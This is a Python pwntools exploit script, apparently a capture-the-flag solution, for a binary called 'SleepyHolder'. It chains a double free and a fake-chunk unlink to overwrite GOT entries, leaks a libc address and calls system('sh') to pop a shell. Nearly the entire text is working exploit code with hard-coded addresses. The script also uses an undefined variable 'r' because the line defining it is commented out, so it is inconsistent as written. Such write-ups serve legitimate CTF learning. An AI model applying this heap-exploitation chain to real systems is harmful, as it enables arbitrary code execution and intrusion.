#!/usr/bin/env python
from pwn import *

# r = remote('52.68.31.117', 9547)
p = process("./SleepyHolder")
context.log_level = 'debug'

def add(index, content):
    p.recvuntil("Renew secret\n")
    p.sendline("1")
    p.recvuntil("\n")
    p.sendline(str(index))
    p.recvuntil("secret: \n")
    p.sendline(content)

def delete(index):
    p.recvuntil("3. Renew secret\n")
    p.sendline("2")
    p.recvuntil("Big secret\n")
    p.sendline(str(index))

def update(index, content):
    p.recvuntil("Renew secret\n")
    p.sendline("3")
    p.recvuntil("Big secret\n")
    p.sendline(str(index))
    p.recvuntil("secret: \n")
    p.sendline(content)

#gdb.attach(r)
add(1, 'aaa')
add(2, 'bbb')
delete(1)
add(3, 'ccc')
delete(1)

f_ptr = 0x6020d0
fake_chunk = p64(0) + p64(0x21)
fake_chunk += p64(f_ptr - 0x18) + p64(f_ptr-0x10)
fake_chunk += p64(0x20)
add(1, fake_chunk)
delete(2)

atoi_GOT = 0x602080
free_GOT = 0x602018
puts_GOT = 0x602020
puts_plt = 0x400760
atoi_offset = 0x36e70
system_offset = 0x45380

f = p64(0)
f += p64(atoi_GOT) + p64(puts_GOT) + p64(free_GOT)
f += p32(1)*2
update(1, f)
update(1, p64(puts_plt))

delete(2)
s = r.recv(6)
libc_base = u64(s.ljust(8, '\x00')) - atoi_offset
system = libc_base + system_offset
update(1, p64(system))
add(2, 'sh\0')
delete(2)


r.interactive()


